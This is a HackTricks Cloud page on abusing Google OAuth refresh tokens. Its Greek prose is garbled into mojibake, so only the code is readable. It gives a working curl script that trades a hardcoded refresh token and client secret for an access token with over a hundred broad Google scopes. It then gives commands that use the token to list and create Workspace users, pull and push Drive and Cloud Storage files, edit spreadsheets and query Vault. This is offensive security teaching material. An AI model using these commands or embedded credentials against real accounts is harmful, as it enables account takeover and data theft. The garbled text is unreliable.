Î©ÏƒÏ„ÏŒÏƒÎ¿, Ï€ÏÎ¿ÏƒÏ€Î¬Î¸Î·ÏƒÎ± Î½Î± Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹Î®ÏƒÏ‰ Î±Ï…Ï„ÏŒ Ï„Î¿ Ï€ÎµÎ´Î¯Î¿ Î³Î¹Î± Î½Î± Î±Ï€Î¿ÎºÏ„Î®ÏƒÏ‰ Ï€ÏÏŒÏƒÎ²Î±ÏƒÎ· ÏƒÏ„Î¿ gmail Î® Î½Î± ÎºÎ±Ï„Î±Î³ÏÎ¬ÏˆÏ‰ Î¿Î¼Î¬Î´ÎµÏ‚ ÎºÎ±Î¹ Î´ÎµÎ½ Î»ÎµÎ¹Ï„Î¿ÏÏÎ³Î·ÏƒÎµ, Î¿Ï€ÏŒÏ„Îµ Î´ÎµÎ½ Î¾Î­ÏÏ‰ Ï€ÏŒÏƒÎ¿ Ï‡ÏÎ®ÏƒÎ¹Î¼Î¿ ÎµÎ¯Î½Î±Î¹ Î±ÎºÏŒÎ¼Î±.

**Î‘Ï€Î¿ÎºÏ„Î®ÏƒÏ„Îµ Î­Î½Î± access token Î¼Îµ ÏŒÎ»Î± Î±Ï…Ï„Î¬ Ï„Î± Ï€ÎµÎ´Î¯Î±**:

<details>

<summary>Bash script Î³Î¹Î± Ï„Î· Î´Î·Î¼Î¹Î¿Ï…ÏÎ³Î¯Î± access token Î±Ï€ÏŒ refresh_token Î¼Îµ ÏŒÎ»Î± Ï„Î± Ï€ÎµÎ´Î¯Î±</summary>
```bash
export scope=$(echo "https://www.googleapis.com/auth/admin.directory.user
https://www.googleapis.com/auth/calendar
https://www.googleapis.com/auth/calendar.events
https://www.googleapis.com/auth/calendar.events.readonly
https://www.googleapis.com/auth/calendar.readonly
https://www.googleapis.com/auth/classroom.courses.readonly
https://www.googleapis.com/auth/classroom.coursework.me.readonly
https://www.googleapis.com/auth/classroom.coursework.students.readonly
https://www.googleapis.com/auth/classroom.profile.emails
https://www.googleapis.com/auth/classroom.profile.photos
https://www.googleapis.com/auth/classroom.rosters.readonly
https://www.googleapis.com/auth/classroom.student-submissions.me.readonly
https://www.googleapis.com/auth/classroom.student-submissions.students.readonly
https://www.googleapis.com/auth/cloud-translation
https://www.googleapis.com/auth/cloud_search.query
https://www.googleapis.com/auth/devstorage.read_write
https://www.googleapis.com/auth/drive
https://www.googleapis.com/auth/drive.apps.readonly
https://www.googleapis.com/auth/drive.file
https://www.googleapis.com/auth/drive.readonly
https://www.googleapis.com/auth/ediscovery
https://www.googleapis.com/auth/firebase.messaging
https://www.googleapis.com/auth/spreadsheets
https://www.googleapis.com/auth/tasks
https://www.googleapis.com/auth/tasks.readonly
https://www.googleapis.com/auth/userinfo.email
https://www.googleapis.com/auth/userinfo.profile
https://www.google.com/accounts/OAuthLogin
https://www.googleapis.com/auth/account.capabilities
https://www.googleapis.com/auth/accounts.programmaticchallenge
https://www.googleapis.com/auth/accounts.reauth
https://www.googleapis.com/auth/admin.directory.user
https://www.googleapis.com/auth/aida
https://www.googleapis.com/auth/kid.management.privileged
https://www.googleapis.com/auth/android_checkin
https://www.googleapis.com/auth/any-api
https://www.googleapis.com/auth/assistant-sdk-prototype
https://www.googleapis.com/auth/auditrecording-pa
https://www.googleapis.com/auth/bce.secureconnect
https://www.googleapis.com/auth/calendar
https://www.googleapis.com/auth/calendar.events
https://www.googleapis.com/auth/calendar.events.readonly
https://www.googleapis.com/auth/calendar.readonly
https://www.googleapis.com/auth/cast.backdrop
https://www.googleapis.com/auth/cclog
https://www.googleapis.com/auth/chrome-model-execution
https://www.googleapis.com/auth/chrome-optimization-guide
https://www.googleapis.com/auth/chrome-safe-browsing
https://www.googleapis.com/auth/chromekanonymity
https://www.googleapis.com/auth/chromeosdevicemanagement
https://www.googleapis.com/auth/chromesync
https://www.googleapis.com/auth/chromewebstore.readonly
https://www.googleapis.com/auth/classroom.courses.readonly
https://www.googleapis.com/auth/classroom.coursework.me.readonly
https://www.googleapis.com/auth/classroom.coursework.students.readonly
https://www.googleapis.com/auth/classroom.profile.emails
https://www.googleapis.com/auth/classroom.profile.photos
https://www.googleapis.com/auth/classroom.rosters.readonly
https://www.googleapis.com/auth/classroom.student-submissions.me.readonly
https://www.googleapis.com/auth/classroom.student-submissions.students.readonly
https://www.googleapis.com/auth/cloud-translation
https://www.googleapis.com/auth/cloud_search.query
https://www.googleapis.com/auth/cryptauth
https://www.googleapis.com/auth/devstorage.read_write
https://www.googleapis.com/auth/drive
https://www.googleapis.com/auth/drive.apps.readonly
https://www.googleapis.com/auth/drive.file
https://www.googleapis.com/auth/drive.readonly
https://www.googleapis.com/auth/ediscovery
https://www.googleapis.com/auth/experimentsandconfigs
https://www.googleapis.com/auth/firebase.messaging
https://www.googleapis.com/auth/gcm
https://www.googleapis.com/auth/googlenow
https://www.googleapis.com/auth/googletalk
https://www.googleapis.com/auth/identity.passwords.leak.check
https://www.googleapis.com/auth/ip-protection
https://www.googleapis.com/auth/kid.family.readonly
https://www.googleapis.com/auth/kid.management.privileged
https://www.googleapis.com/auth/kid.permission
https://www.googleapis.com/auth/kids.parentapproval
https://www.googleapis.com/auth/kids.supervision.setup.child
https://www.googleapis.com/auth/lens
https://www.googleapis.com/auth/music
https://www.googleapis.com/auth/nearbydevices-pa
https://www.googleapis.com/auth/nearbypresence-pa
https://www.googleapis.com/auth/nearbysharing-pa
https://www.googleapis.com/auth/peopleapi.readonly
https://www.googleapis.com/auth/peopleapi.readwrite
https://www.googleapis.com/auth/photos
https://www.googleapis.com/auth/photos.firstparty.readonly
https://www.googleapis.com/auth/photos.image.readonly
https://www.googleapis.com/auth/profile.language.read
https://www.googleapis.com/auth/secureidentity.action
https://www.googleapis.com/auth/spreadsheets
https://www.googleapis.com/auth/supportcontent
https://www.googleapis.com/auth/tachyon
https://www.googleapis.com/auth/tasks
https://www.googleapis.com/auth/tasks.readonly
https://www.googleapis.com/auth/userinfo.email
https://www.googleapis.com/auth/userinfo.profile
https://www.googleapis.com/auth/wallet.chrome" | tr '\n' ' ')

curl -s --data "client_id=77185425430.apps.googleusercontent.com" \
--data "client_secret=OTJgUOQcT7lO7GsGZq2G4IlT" \
--data "grant_type=refresh_token" \
--data "refresh_token=1//03gQU44mwVnU4CDHYE736TGMSNwF-L9IrTuikNFVZQ3sBxshrJaki7QvpHZQMeANHrF0eIPebz0dz0S987354AuSdX38LySlWflI" \
--data "scope=$scope" \
https://www.googleapis.com/oauth2/v4/token
```
</details>

ÎŸÏÎ¹ÏƒÎ¼Î­Î½Î± Ï€Î±ÏÎ±Î´ÎµÎ¯Î³Î¼Î±Ï„Î± Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹ÏÎ½Ï„Î±Ï‚ Î¼ÎµÏÎ¹ÎºÎ¿ÏÏ‚ Î±Ï€ÏŒ Î±Ï…Ï„Î¿ÏÏ‚ Ï„Î¿Ï…Ï‚ Ï„Î¿Î¼ÎµÎ¯Ï‚:

<details>

<summary>https://www.googleapis.com/auth/userinfo.email &#x26; https://www.googleapis.com/auth/userinfo.profile</summary>
```bash
curl -X GET \
-H "Authorization: Bearer $access_token" \
"https://www.googleapis.com/oauth2/v2/userinfo"

{
"id": "100203736939176354570",
"email": "hacktricks@example.com",
"verified_email": true,
"name": "John Smith",
"given_name": "John",
"family_name": "Smith",
"picture": "https://lh3.googleusercontent.com/a/ACg8ocKLvue[REDACTED]wcnzhyKH_p96Gww=s96-c",
"locale": "en",
"hd": "example.com"
}
```
</details>

<details>

<summary>https://www.googleapis.com/auth/admin.directory.user</summary>
```bash
# List users
curl -X GET \
-H "Authorization: Bearer $access_token" \
"https://www.googleapis.com/admin/directory/v1/users?customer=<workspace_id>&maxResults=100&orderBy=email"

# Create user
curl -X POST \
-H "Authorization: Bearer $access_token" \
-H "Content-Type: application/json" \
-d '{
"primaryEmail": "newuser@hdomain.com",
"name": {
"givenName": "New",
"familyName": "User"
},
"password": "UserPassword123",
"changePasswordAtNextLogin": true
}' \
"https://www.googleapis.com/admin/directory/v1/users"
```
</details>

<details>

<summary>https://www.googleapis.com/auth/drive</summary>
```bash
# List files
curl -X GET \
-H "Authorization: Bearer $access_token" \
"https://www.googleapis.com/drive/v3/files?pageSize=10&fields=files(id,name,modifiedTime)&orderBy=name"
{
"files": [
{
"id": "1Z8m5ALSiHtewoQg1LB8uS9gAIeNOPBrq",
"name": "Veeam new vendor form 1 2024.docx",
"modifiedTime": "2024-08-30T09:25:35.219Z"
}
]
}

# Download file
curl -X GET \
-H "Authorization: Bearer $access_token" \
"https://www.googleapis.com/drive/v3/files/<file-id>?alt=media" \
-o "DownloadedFileName.ext"

# Upload file
curl -X POST \
-H "Authorization: Bearer $access_token" \
-H "Content-Type: application/octet-stream" \
--data-binary @path/to/file.ext \
"https://www.googleapis.com/upload/drive/v3/files?uploadType=media"
```
</details>

<details>

<summary>https://www.googleapis.com/auth/devstorage.read_write</summary>
```bash
# List buckets from a project
curl -X GET \
-H "Authorization: Bearer $access_token" \
"https://www.googleapis.com/storage/v1/b?project=<project-id>"

# List objects in a bucket
curl -X GET \
-H "Authorization: Bearer $access_token" \
"https://www.googleapis.com/storage/v1/b/<bucket-name>/o?maxResults=10&fields=items(id,name,size,updated)&orderBy=name"

# Upload file to bucket
curl -X POST \
-H "Authorization: Bearer $access_token" \
-H "Content-Type: application/octet-stream" \
--data-binary @path/to/yourfile.ext \
"https://www.googleapis.com/upload/storage/v1/b/<BUCKET_NAME>/o?uploadType=media&name=<OBJECT_NAME>"

# Download file from bucket
curl -X GET \
-H "Authorization: Bearer $access_token" \
"https://www.googleapis.com/storage/v1/b/BUCKET_NAME/o/OBJECT_NAME?alt=media" \
-o "DownloadedFileName.ext"
```
</details>

<details>

<summary>https://www.googleapis.com/auth/spreadsheets</summary>
```bash
# List spreadsheets
curl -X GET \
-H "Authorization: Bearer $access_token" \
"https://www.googleapis.com/drive/v3/files?q=mimeType='application/vnd.google-apps.spreadsheet'&fields=files(id,name,modifiedTime)&pageSize=100"

# Download as pdf
curl -X GET \
-H "Authorization: Bearer $access_token" \
"https://www.googleapis.com/drive/v3/files/106VJxeyIsVTkixutwJM1IiJZ0ZQRMiA5mhfe8C5CxMc/export?mimeType=application/pdf" \
-o "Spreadsheet.pdf"

# Create spreadsheet
curl -X POST \
-H "Authorization: Bearer $access_token" \
-H "Content-Type: application/json" \
-d '{
"properties": {
"title": "New Spreadsheet"
}
}' \
"https://sheets.googleapis.com/v4/spreadsheets"

# Read data from a spreadsheet
curl -X GET \
-H "Authorization: Bearer $access_token" \
"https://sheets.googleapis.com/v4/spreadsheets/<SPREADSHEET_ID>/values/Sheet1!A1:C10"

# Update data in spreadsheet
curl -X PUT \
-H "Authorization: Bearer $access_token" \
-H "Content-Type: application/json" \
-d '{
"range": "Sheet1!A2:C2",
"majorDimension": "ROWS",
"values": [
["Alice Johnson", "28", "alice.johnson@example.com"]
]
}' \
"https://sheets.googleapis.com/v4/spreadsheets/<SPREADSHEET_ID>/values/Sheet1!A2:C2?valueInputOption=USER_ENTERED"

# Append data
curl -X POST \
-H "Authorization: Bearer $access_token" \
-H "Content-Type: application/json" \
-d '{
"values": [
["Bob Williams", "35", "bob.williams@example.com"]
]
}' \
"https://sheets.googleapis.com/v4/spreadsheets/SPREADSHEET_ID/values/Sheet1!A:C:append?valueInputOption=USER_ENTERED"
```
</details>

<details>

<summary>https://www.googleapis.com/auth/ediscovery (Google Vault)</summary>

**Google Workspace Vault** ÎµÎ¯Î½Î±Î¹ Î­Î½Î± Ï€ÏÏŒÏƒÎ¸ÎµÏ„Î¿ Î³Î¹Î± Ï„Î¿ Google Workspace Ï€Î¿Ï… Ï€Î±ÏÎ­Ï‡ÎµÎ¹ ÎµÏÎ³Î±Î»ÎµÎ¯Î± Î³Î¹Î± Ï„Î· Î´Î¹Î±Ï„Î®ÏÎ·ÏƒÎ· Î´ÎµÎ´Î¿Î¼Î­Î½Ï‰Î½, Î±Î½Î±Î¶Î®Ï„Î·ÏƒÎ· ÎºÎ±Î¹ ÎµÎ¾Î±Î³Ï‰Î³Î® Î³Î¹Î± Ï„Î± Î´ÎµÎ´Î¿Î¼Î­Î½Î± Ï„Î·Ï‚ Î¿ÏÎ³Î¬Î½Ï‰ÏƒÎ®Ï‚ ÏƒÎ±Ï‚ Ï€Î¿Ï… Î±Ï€Î¿Î¸Î·ÎºÎµÏÎ¿Î½Ï„Î±Î¹ ÏƒÎµ Ï…Ï€Î·ÏÎµÏƒÎ¯ÎµÏ‚ Ï„Î¿Ï… Google Workspace ÏŒÏ€Ï‰Ï‚ Ï„Î¿ Gmail, Ï„Î¿ Drive, Ï„Î¿ Chat ÎºÎ±Î¹ Î¬Î»Î»Î±.

* ÎˆÎ½Î± **Matter** ÏƒÏ„Î¿ Google Workspace Vault ÎµÎ¯Î½Î±Î¹ Î­Î½Î± **Î´Î¿Ï‡ÎµÎ¯Î¿** Ï€Î¿Ï… Î¿ÏÎ³Î±Î½ÏÎ½ÎµÎ¹ ÎºÎ±Î¹ Î¿Î¼Î±Î´Î¿Ï€Î¿Î¹ÎµÎ¯ ÏŒÎ»ÎµÏ‚ Ï„Î¹Ï‚ Ï€Î»Î·ÏÎ¿Ï†Î¿ÏÎ¯ÎµÏ‚ Ï€Î¿Ï… ÏƒÏ‡ÎµÏ„Î¯Î¶Î¿Î½Ï„Î±Î¹ Î¼Îµ Î¼Î¹Î± ÏƒÏ…Î³ÎºÎµÎºÏÎ¹Î¼Î­Î½Î· Ï…Ï€ÏŒÎ¸ÎµÏƒÎ·, Î­ÏÎµÏ…Î½Î± Î® Î½Î¿Î¼Î¹ÎºÏŒ Î¶Î®Ï„Î·Î¼Î±. Î›ÎµÎ¹Ï„Î¿Ï…ÏÎ³ÎµÎ¯ Ï‰Ï‚ Ï„Î¿ ÎºÎµÎ½Ï„ÏÎ¹ÎºÏŒ ÏƒÎ·Î¼ÎµÎ¯Î¿ Î³Î¹Î± Ï„Î· Î´Î¹Î±Ï‡ÎµÎ¯ÏÎ¹ÏƒÎ· Ï„Ï‰Î½ **Holds**, **Searches** ÎºÎ±Î¹ **Exports** Ï€Î¿Ï… Î±Ï†Î¿ÏÎ¿ÏÎ½ Î±Ï…Ï„ÏŒ Ï„Î¿ ÏƒÏ…Î³ÎºÎµÎºÏÎ¹Î¼Î­Î½Î¿ Î¶Î®Ï„Î·Î¼Î±.
* ÎˆÎ½Î± **Hold** ÏƒÏ„Î¿ Google Workspace Vault ÎµÎ¯Î½Î±Î¹ Î¼Î¹Î± **ÎµÎ½Î­ÏÎ³ÎµÎ¹Î± Î´Î¹Î±Ï„Î®ÏÎ·ÏƒÎ·Ï‚** Ï€Î¿Ï… ÎµÏ†Î±ÏÎ¼ÏŒÎ¶ÎµÏ„Î±Î¹ ÏƒÎµ ÏƒÏ…Î³ÎºÎµÎºÏÎ¹Î¼Î­Î½Î¿Ï…Ï‚ Ï‡ÏÎ®ÏƒÏ„ÎµÏ‚ Î® Î¿Î¼Î¬Î´ÎµÏ‚ Î³Î¹Î± Î½Î± **Î±Ï€Î¿Ï„ÏÎ±Ï€ÎµÎ¯ Î· Î´Î¹Î±Î³ÏÎ±Ï†Î® Î® Î· Ï„ÏÎ¿Ï€Î¿Ï€Î¿Î¯Î·ÏƒÎ·** Ï„Ï‰Î½ Î´ÎµÎ´Î¿Î¼Î­Î½Ï‰Î½ Ï„Î¿Ï…Ï‚ ÎµÎ½Ï„ÏŒÏ‚ Ï„Ï‰Î½ Ï…Ï€Î·ÏÎµÏƒÎ¹ÏÎ½ Ï„Î¿Ï… Google Workspace. Î¤Î± Holds Î´Î¹Î±ÏƒÏ†Î±Î»Î¯Î¶Î¿Ï…Î½ ÏŒÏ„Î¹ Î¿Î¹ ÏƒÏ‡ÎµÏ„Î¹ÎºÎ­Ï‚ Ï€Î»Î·ÏÎ¿Ï†Î¿ÏÎ¯ÎµÏ‚ Ï€Î±ÏÎ±Î¼Î­Î½Î¿Ï…Î½ Î±Î½Î­Ï€Î±Ï†ÎµÏ‚ ÎºÎ±Î¹ Î±Î¼ÎµÏ„Î¬Î²Î»Î·Ï„ÎµÏ‚ Î³Î¹Î± Ï„Î· Î´Î¹Î¬ÏÎºÎµÎ¹Î± Î¼Î¹Î±Ï‚ Î½Î¿Î¼Î¹ÎºÎ®Ï‚ Ï…Ï€ÏŒÎ¸ÎµÏƒÎ·Ï‚ Î® Î­ÏÎµÏ…Î½Î±Ï‚.
```bash
# List matters
curl -X GET \
-H "Authorization: Bearer $access_token" \
"https://vault.googleapis.com/v1/matters?pageSize=10"

# Create matter
curl -X POST \
-H "Authorization: Bearer $access_token" \
-H "Content-Type: application/json" \
-d '{
"name": "Legal Case 2024",
"description": "Matter for the upcoming legal case involving XYZ Corp.",
"state": "OPEN"
}' \
"https://vault.googleapis.com/v1/matters"

# Get specific matter
curl -X GET \
-H "Authorization: Bearer $access_token" \
"https://vault.googleapis.com/v1/matters/<MATTER_ID>"

# List holds in a matter
curl -X GET \
-H "Authorization: Bearer $access_token" \
"https://vault.googleapis.com/v1/matters/<MATTER_ID>/holds?pageSize=10"
```
More [API endpoints in the docs](https://developers.google.com/vault/reference/rest).

</details>

## Î‘Î½Î±Ï†Î¿ÏÎ­Ï‚

* [https://www.netskope.com/blog/gcp-oauth-token-hijacking-in-google-cloud-part-1](https://www.netskope.com/blog/gcp-oauth-token-hijacking-in-google-cloud-part-1)
* [https://www.netskope.com/blog/gcp-oauth-token-hijacking-in-google-cloud-part-2](https://www.netskope.com/blog/gcp-oauth-token-hijacking-in-google-cloud-part-2)
* [https://www.youtube.com/watch?v=FEQxHRRP\_5I](https://www.youtube.com/watch?v=FEQxHRRP\_5I)
* [https://issues.chromium.org/issues/40063291](https://issues.chromium.org/issues/40063291)

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../../../.gitbook/assets/image (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/image (1).png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
